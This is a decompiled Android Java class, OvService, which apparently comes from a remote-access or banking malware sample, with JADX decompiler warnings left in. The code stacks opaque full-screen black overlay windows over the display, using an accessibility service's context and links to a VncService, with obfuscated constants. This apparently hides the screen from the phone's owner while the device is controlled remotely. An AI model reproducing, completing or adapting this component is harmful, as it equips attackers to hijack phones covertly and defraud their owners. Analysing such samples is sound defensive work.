package com.mistral.jon.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import com.mistral.jon.services.a11y.AcService;
import java.util.ArrayList;
import java.util.List;
import java.util.function.Consumer;
import p001z.ayp;
import p001z.bbe;
import p001z.bcq;

/* JADX INFO: loaded from: classes.dex */
public class OvService extends Service {

    /* JADX INFO: renamed from: a */
    private static final String str = "OvService";

    /* JADX INFO: renamed from: a */
    private static long[] f747a = {877645284, 1916335574, 1653579533, 342889981, 160700843, 928263870, 449661546, 1505404, 313425345, 1260774663, -657903987, 1083765051, -1845824740, 627578290, -717381811, 334665636, -1219181575, 1687592241, -580032732, 774261289, 2038092600, 863339504, 1126870607, 1006505199, 1233520007, 50384185, -389530390, 1615007093, 49208507, 857044287, 1586945320, 1388021173, 43979020, -825485335, 202568840, 709974515, 547139378, 2117524325, -1431093506, 1766811313, 2028664773, 241046508, 41290307, -424223061, 824970592, -1497055898, 1562662456, -1537195161, 883892219, -1099415856, 446365290, 1565634847, 1247799729, -978099041, 1554697101, 611655365, 289894641, 1001580847, 482694881, 1493902898, 505093176, 1693003385, 558143354, 1499590782, 500584332, 174782370, 424352514, 1436336549, 1336665052, 1262663664, 1713868519, 164957953, 383771658, 154293811, 1911444359, 1211969423, 544157521, 1571662563, 472255030, 1683810520, 535929647, -1076189405, -588255080, 394898216, 1274850313, 1526570097, -140775117, -12580887, -1201087839, -947168052, -191230213, 1688277633, -1630314332, 1397478980, 439320690, 2100275837, 117260367, 1680121867, 1023101000, 93839836, -1583908404, -1631916757, -1179933298, -1081781107, 1506045207, 986235428, 308718460, 477761162, 1423408408, 616259614, 1214641544, 717462490, 967013955, 1274925272, -1463624260, -128964720, -1461154202, 1138305945, -1620463800, -1239494453, 1016817274, -1957672494, 1256968690, 1312453394, 2102663875};

    /* JADX INFO: renamed from: b */
    private static final String str2 = "aa";

    /* JADX INFO: renamed from: a */
    private int f748a;

    /* JADX INFO: renamed from: a */
    private WindowManager windowManager;

    /* JADX INFO: renamed from: a */
    private bbe bbeVar;

    /* JADX INFO: renamed from: a */
    private final List<View> list = new ArrayList();

    /* JADX INFO: renamed from: a */
    private Context context = null;

    /* JADX INFO: renamed from: a */
    private boolean f749a = false;

    /* JADX INFO: renamed from: b */
    private int f750b = 2;

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX INFO: renamed from: a */
    private View m1070a() {
        Context context = this.context;
        if (context == null) {
            context = this;
        }
        View view = new View(context);
        view.setClickable(false);
        view.setOnTouchListener(new View.OnTouchListener() { // from class: com.mistral.jon.services.-$$Lambda$OvService$sbWLqHGmpnrT3NHvrKSVD0dzdmY
            private /* synthetic */ $$Lambda$OvService$sbWLqHGmpnrT3NHvrKSVD0dzdmY() {
            }

            @Override // android.view.View.OnTouchListener
            public final boolean onTouch(View view2, MotionEvent event) {
                return OvService.lambda$sbWLqHGmpnrT3NHvrKSVD0dzdmY(view2, event);
            }
        });
        view.setBackgroundColor(-16777216);
        view.setSystemUiVisibility(5895);
        view.setAlpha(1.0f);
        return view;
    }

    /* JADX INFO: renamed from: a */
    private WindowManager.LayoutParams m1071a() {
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(-1, -1, this.f748a, 1720, -3);
        DisplayMetrics metrics = new DisplayMetrics();
        this.windowManager.getDefaultDisplay().getMetrics(metrics);
        layoutParams.width = metrics.widthPixels;
        layoutParams.height = metrics.heightPixels + 2000;
        layoutParams.alpha = 0.5f;
        return layoutParams;
    }

    /* JADX INFO: String decrypt: "Showed" */
    /* JADX INFO: renamed from: a */
    private void m1072a() {
        if (this.list.size() == 0) {
            try {
                for (int i = 0; i < this.f750b; i++) {
                    View view = m1070a();
                    this.windowManager.addView(view, m1071a());
                    this.list.add(view);
                }
                ayp.m4254a().m4259a("Showed", str);
            } catch (Exception e) {
                ayp.m4254a().m4260a(e.toString(), str, 6);
                this.list.forEach(new Consumer() { // from class: com.mistral.jon.services.-$$Lambda$OvService$Zf0cF0OZpkvgHbNeDm6l-CAn3Xo
                    public /* synthetic */ $$Lambda$OvService$Zf0cF0OZpkvgHbNeDm6lCAn3Xo() {
                    }

                    @Override // java.util.function.Consumer
                    public final void accept(Object obj) {
                        OvService.m10591lambda$Zf0cF0OZpkvgHbNeDm6lCAn3Xo(this.f$0, (View) obj);
                    }
                });
                this.list.clear();
            }
        }
    }

    /* JADX INFO: renamed from: a */
    private /* synthetic */ void m1073a(View view) {
        this.windowManager.removeView(view);
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX INFO: renamed from: a */
    private static /* synthetic */ boolean m1074a(View view, MotionEvent event) {
        return false;
    }

    /* JADX INFO: String decrypt: "Hided" */
    /* JADX INFO: renamed from: b */
    private void m1075b() {
        if (this.list.size() > 0) {
            this.list.forEach(new Consumer() { // from class: com.mistral.jon.services.-$$Lambda$OvService$vVEFa805mRkaeO21Vrt8vOfAgS0
                public /* synthetic */ $$Lambda$OvService$vVEFa805mRkaeO21Vrt8vOfAgS0() {
                }

                @Override // java.util.function.Consumer
                public final void accept(Object obj) {
                    OvService.lambda$vVEFa805mRkaeO21Vrt8vOfAgS0(this.f$0, (View) obj);
                }
            });
            this.list.clear();
            ayp.m4254a().m4259a("Hided", str);
        }
    }

    /* JADX INFO: renamed from: b */
    private /* synthetic */ void m1076b(View view) {
        this.windowManager.removeView(view);
    }

    /* JADX INFO: renamed from: lambda$Zf0cF0OZpkvgHbNeDm6l-CAn3Xo */
    public static /* synthetic */ void m10591lambda$Zf0cF0OZpkvgHbNeDm6lCAn3Xo(OvService ovService, View view) {
        ovService.m1076b(view);
    }

    public static /* synthetic */ boolean lambda$sbWLqHGmpnrT3NHvrKSVD0dzdmY(View view, MotionEvent event) {
        return m1074a(view, event);
    }

    public static /* synthetic */ void lambda$vVEFa805mRkaeO21Vrt8vOfAgS0(OvService ovService, View view) {
        ovService.m1073a(view);
    }

    /* JADX INFO: String decrypt: "Not yet implemented" */
    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        this.windowManager = (WindowManager) getSystemService(WindowManager.class);
        this.bbeVar = new bbe(bcq.m4272a(this));
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference fix 'apply assigned field type' failed
    java.lang.UnsupportedOperationException: ArgType.getObject(), call class: class jadx.core.dex.instructions.args.ArgType$UnknownArg
    	at jadx.core.dex.instructions.args.ArgType.getObject(ArgType.java:596)
    	at jadx.core.dex.attributes.nodes.ClassTypeVarsAttr.getTypeVarsMapFor(ClassTypeVarsAttr.java:35)
    	at jadx.core.dex.nodes.utils.TypeUtils.replaceClassGenerics(TypeUtils.java:177)
    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.insertExplicitUseCast(FixTypesVisitor.java:397)
    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.tryFieldTypeWithNewCasts(FixTypesVisitor.java:359)
    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.applyFieldType(FixTypesVisitor.java:309)
    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:94)
     */
    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        m1075b();
        this.f749a = false;
        this.context = null;
        this.bbeVar.m4455a(false);
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference fix 'apply assigned field type' failed
    java.lang.UnsupportedOperationException: ArgType.getObject(), call class: class jadx.core.dex.instructions.args.ArgType$UnknownArg
    	at jadx.core.dex.instructions.args.ArgType.getObject(ArgType.java:596)
    	at jadx.core.dex.attributes.nodes.ClassTypeVarsAttr.getTypeVarsMapFor(ClassTypeVarsAttr.java:35)
    	at jadx.core.dex.nodes.utils.TypeUtils.replaceClassGenerics(TypeUtils.java:177)
    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.insertExplicitUseCast(FixTypesVisitor.java:397)
    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.tryFieldTypeWithNewCasts(FixTypesVisitor.java:359)
    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.applyFieldType(FixTypesVisitor.java:309)
    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:94)
     */
    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        long j;
        int i3;
        int i4;
        if (VncService.f758b) {
            stopSelf();
            j = 1653579533;
        } else if (this.f749a || intent == null) {
            j = 1653579533;
        } else {
            this.bbeVar.m4455a(true);
            this.f749a = true;
            int i5 = intent.getBooleanExtra(str2, true) ? 2038 : 2032;
            this.f748a = i5;
            if (i5 == 2032) {
                this.context = AcService.acService;
                i3 = 342889981;
                i4 = 342889982;
            } else {
                this.context = null;
                i3 = 1916335574;
                i4 = 1916335572;
            }
            this.f750b = i3 ^ i4;
            Context context = this.context;
            if (context != null) {
                this.windowManager = (WindowManager) context.getSystemService("window");
            }
            m1072a();
            j = 1653579533;
        }
        return 1;
    }
}
